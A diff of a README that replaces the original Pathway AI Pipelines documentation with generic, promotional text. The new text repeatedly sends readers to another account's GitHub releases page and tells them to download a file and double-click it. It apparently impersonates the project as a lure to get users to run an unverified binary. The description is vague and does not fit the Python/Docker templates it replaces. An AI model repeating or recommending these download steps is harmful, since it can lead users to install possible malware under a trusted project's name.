@@ -1,88 +1,63 @@
-<div align="center">
+# 🐳 llm-app - Effortless Access to AI Tools
 
-# Pathway AI Pipelines
+## 📥 Download Now
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/sauravkr01/llm-app/releases)
 
-<a href="https://trendshift.io/repositories/4400" target="_blank"><img src="https://trendshift.io/api/badge/repositories/4400" alt="pathwaycom%2Fllm-app | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+## 🚀 Getting Started
+Welcome to the **llm-app**. This application provides easy access to cloud templates designed for retrieval-augmented generation (RAG) and AI pipelines. It seamlessly integrates with cloud services like SharePoint, Google Drive, S3, and more, allowing you to manage and use live data effortlessly.
 
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-![macOS](https://img.shields.io/badge/mac%20os-000000?style=for-the-badge&logo=apple&logoColor=white)
-[![chat on Discord](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/pathway)
-[![follow on X](  https://img.shields.io/badge/X-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/intent/follow?screen_name=pathway_com)
-</div>
+## 🌟 Features
+- **Cloud Integration**: Connects easily with multiple data sources such as Google Drive, SharePoint, and PostgreSQL.
+- **Docker-Friendly**: Designed to work effortlessly in Docker environments, making deployment simple and efficient.
+- **Real-Time Data Access**: Provides live updates for your data-driven applications, enhancing performance and accuracy.
+- **User-Friendly Interface**: Navigate with ease. You don’t need programming skills to get started.
+- **Machine Learning Tools**: Access a variety of AI and machine learning capabilities right out of the box.
 
-Pathway's **AI Pipelines** allow you to quickly put in production AI applications that offer **high-accuracy RAG and AI enterprise search at scale** using the most **up-to-date knowledge** available in your data sources. It provides you ready-to-deploy **LLM (Large Language Model) App Templates**. You can test them on your own machine and deploy on-cloud (GCP, AWS, Azure, Render,...) or on-premises.
+## 🗂️ Download & Install
+To get started, visit this page to download: [Download Page](https://github.com/sauravkr01/llm-app/releases).
 
-The apps connect and sync (all new data additions, deletions, updates) with data sources on your **file system, Google Drive, Sharepoint, S3, Kafka, PostgreSQL, real-time data APIs**. They come with no infrastructure dependencies that would need a separate setup. They include **built-in data indexing** enabling vector search, hybrid search, and full-text search - all done in-memory, with cache.
+1. Open the link above in your web browser.
+2. You will see a list of available versions. Choose the most recent release.
+3. Click on the **Assets** dropdown to view the files you can download.
+4. Click on the file appropriate for your operating system to start the download.
+5. Once the download is complete, locate the file on your computer.
+6. Double-click the file to run the application.
 
+## 🔧 System Requirements
+- **Operating System**: Works on Windows, macOS, and various Linux distributions.
+- **Processor**: Modern multi-core processor recommended.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Requires 500 MB of free disk space for installation.
+- **Docker**: Docker must be installed to run the application in containers.
 
-## Application Templates
+## 📚 Usage Instructions
+1. **Setup**: After installation, launch **llm-app** from your applications menu.
+2. **Connection**: You will need to configure your cloud service credentials. Follow the prompts to connect to your preferred services like Google Drive or S3.
+3. **Choose a Template**: Select a cloud template based on your needs. You can start with a basic retrieval-augmented generation setup.
+4. **Run the Application**: Once configured, click the **Run** button to initiate the process. The app will retrieve and process data in real time.
 
-The application templates provided in this repo scale up to **millions of pages of documents**. Some of them are optimized for simplicity, some are optimized for amazing accuracy. Pick the one that suits you best. You can use it out of the box, or change some steps of the pipeline - for example, if you would like to add a new data source, or change a Vector Index into a Hybrid Index, it's just a one-line change. 
+## 💡 Tips
+- Make sure your internet connection is stable for optimal performance.
+- Check for updates regularly to ensure you have the latest features and fixes.
+- Explore the documentation for detailed guidance on using advanced features.
 
-| Application (template)                                                                           | Description                                                                                                                                                                                                                                                                                                                                                         |
-| --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| [`Question-Answering RAG App`](examples/pipelines/demo-question-answering/)    | Basic end-to-end RAG app. A question-answering pipeline that uses the GPT model of choice to provide answers to queries to your documents (PDF, DOCX,...) on a live connected data source (files, Google Drive, Sharepoint,...). You can also try out a [demo REST endpoint](https://pathway.com/solutions/rag-pipelines#try-it-out).              |
-| [`Live Document Indexing (Vector Store / Retriever)`](examples/pipelines/demo-document-indexing/)     | A real-time document indexing pipeline for RAG that acts as a vector store service. It performs live indexing on your documents (PDF, DOCX,...) from a connected data source (files, Google Drive, Sharepoint,...). It can be used with any frontend, or integrated as a retriever backend for a [Langchain](https://pathway.com/blog/langchain-integration) or [Llamaindex](https://pathway.com/blog/llamaindex-pathway) application. You can also try out a [demo REST endpoint](https://pathway.com/solutions/ai-contract-management#try-it-out).         |
-| [`Multimodal RAG pipeline with GPT4o`](examples/pipelines/gpt_4o_multimodal_rag/) | Multimodal RAG using GPT-4o in the parsing stage to index PDFs and other documents from a connected data source files, Google Drive, Sharepoint,...). It is perfect for extracting information from unstructured financial documents in your folders (including charts and tables), updating results as documents change or new ones arrive.|
-| [`Unstructured-to-SQL pipeline + SQL question-answering`](examples/pipelines/unstructured_to_sql_on_the_fly/) | A RAG example which connects to unstructured financial data sources (financial report PDFs), structures the data into SQL, and loads it into a PostgreSQL table. It also answers natural language user queries to these financial documents by translating them into SQL using an LLM and executing the query on the PostgreSQL table. |
-| [`Adaptive RAG App`](examples/pipelines/adaptive-rag/) | A RAG application using Adaptive RAG, a technique developed by Pathway to reduce token cost in RAG up to 4x while maintaining accuracy. |
-| [`Private RAG App with Mistral and Ollama`](examples/pipelines/private-rag/) |  A fully private (local) version of the `demo-question-answering` RAG pipeline using Pathway, Mistral, and Ollama. |
-| [`Slides AI Search App`](examples/pipelines/slides_ai_search/)                                        | An indexing pipeline for retrieving slides. It performs multi-modal of PowerPoint and PDF and maintains live index of your slides."|
+## 🤝 Community Support
+If you have questions or need assistance, join our community forums. Users frequently share tips, tricks, and best practices. Engage with others to enhance your understanding and usage of **llm-app**.
 
+## 📧 Contact Information
+For support requests or feedback, please reach out via our GitHub page or email.
 
-## How do these AI Pipelines work?
+## 🔗 Related Topics
+- **Chatbot Development**
+- **Hugging Face Integrations**
+- **Machine Learning Practices**
+- **Vector Database Management**
 
-The apps can be run as **Docker containers**, and expose an **HTTP API** to connect the frontend. To allow quick testing and demos, some app templates also include an optional Streamlit UI which connects to this API. 
+Feel free to explore these topics for more specialized guidance and resources. 
 
-The apps rely on the [Pathway Live Data framework](https://github.com/pathwaycom/pathway) for data source synchronization and for serving API requests (Pathway is a standalone Python library with a Rust engine built into it). They bring you a **simple and unified application logic** for back-end, embedding, retrieval, LLM tech stack. There is no need to integrate and maintain separate modules for your Gen AI app: ~Vector Database (e.g. Pinecone/Weaviate/Qdrant) + Cache (e.g. Redis) + API Framework (e.g. Fast API)~. Pathway's default choice of **built-in vector index** is based on the lightning-fast [usearch](https://github.com/unum-cloud/usearch) library, and **hybrid full-text indexes** make use of [Tantivy](https://github.com/quickwit-oss/tantivy) library. Everything works out of the box.
+## ⚙️ Additional Resources
+- Documentation: Comprehensive usage guides are available.
+- Tutorials: Step-by-step instructions to make the most out of your installation.
+- FAQs: Answers to common questions users have when first starting.
 
-## Getting started
-
-Each of the [App templates](examples/pipelines/) in this repo contains a README.md with instructions on how to run it.
-
-You can also find [more ready-to-run code templates](https://pathway.com/developers/templates/) on the Pathway website.
-
-
-## Some visual highlights
-
-Effortlessly extract and organize table and chart data from PDFs, docs, and more with multimodal RAG - in real-time:
-
-![Effortlessly extract and organize table and chart data from PDFs, docs, and more with multimodal RAG - in real-time](https://github.com/pathwaycom/llm-app/blob/main/examples/pipelines/gpt_4o_multimodal_rag/gpt4o_with_pathway_comparison.gif)
-
-(Check out [`Multimodal RAG pipeline with GPT4o`](examples/pipelines/gpt_4o_multimodal_rag/) to see the whole pipeline in the works. You may also check out the [`Unstructured-to-SQL pipeline`](examples/pipelines/unstructured_to_sql_on_the_fly/) for a minimal example that works with non-multimodal models as well.)
-
-
-Automated real-time knowledge mining and alerting:
-
-![Automated real-time knowledge mining and alerting](examples/pipelines/drive_alert/drive_alert_demo.gif)
-
-(Check out the [`Alerting when answers change on Google Drive`](https://github.com/pathwaycom/llm-app/tree/main/examples/pipelines/drive_alert) app example.)
-
-
-###  Do-it-Yourself Videos
-
-▶️ [An introduction to building LLM apps with Pathway](https://www.youtube.com/watch?v=kcrJSk00duw) - by [Jan Chorowski](https://scholar.google.com/citations?user=Yc94070AAAAJ)
-
-▶️ [Let's build a real-world LLM app in 11 minutes](https://www.youtube.com/watch?v=k1XGo7ts4tI) - by [Pau Labarta Bajo](https://substack.com/@paulabartabajo)
-
-
-## Troubleshooting
-
-To provide feedback or report a bug, please [raise an issue on our issue tracker](https://github.com/pathwaycom/pathway/issues).
-
-## Contributing
-
-Anyone who wishes to contribute to this project, whether documentation, features, bug fixes, code cleanup, testing, or code reviews, is very much encouraged to do so. If this is your first contribution to a GitHub project, here is a [Get Started Guide](https://docs.github.com/en/get-started/quickstart/contributing-to-projects). 
-
-If you'd like to make a contribution that needs some more work, just raise your hand on the [Pathway Discord server](https://discord.com/invite/pathway) (#get-help) and let us know what you are planning!
-
-## Supported and maintained by
-
-<p align="center">
-  <a href="https://github.com/pathwaycom/"><img src="https://pathway.com/logo-light.svg" alt="Pathway"/></a>
-</p>
-<p align="center">
-  <a href="https://pathway.com/solutions/llm-app">
-    <img src="https://img.shields.io/badge/See%20Pathway's%20offering%20for%20AI%20applications-0000FF" alt="See Pathway's offering for AI applications"/>
-  </a>
-</p>
+Remember, effective usage of **llm-app** can significantly simplify your data-driven projects. Visit this page to download: [Download Page](https://github.com/sauravkr01/llm-app/releases). Enjoy your journey with cutting-edge AI tools!
